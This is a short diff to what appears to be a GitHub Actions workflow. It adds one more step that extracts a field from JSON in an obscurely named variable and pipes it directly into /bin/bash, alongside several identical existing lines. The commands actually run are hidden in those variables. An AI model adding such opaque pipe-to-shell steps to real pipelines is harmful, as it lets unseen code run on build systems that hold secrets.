@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$q40" | jq -r .dgj300 | /bin/bash
           echo $fl337 | jq -r .y7646 | /bin/bash
           printf '%s' "$x8" | jq -r .lg739 | /bin/bash
+          printf '%s' "$pysw752" | jq -r .xji2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
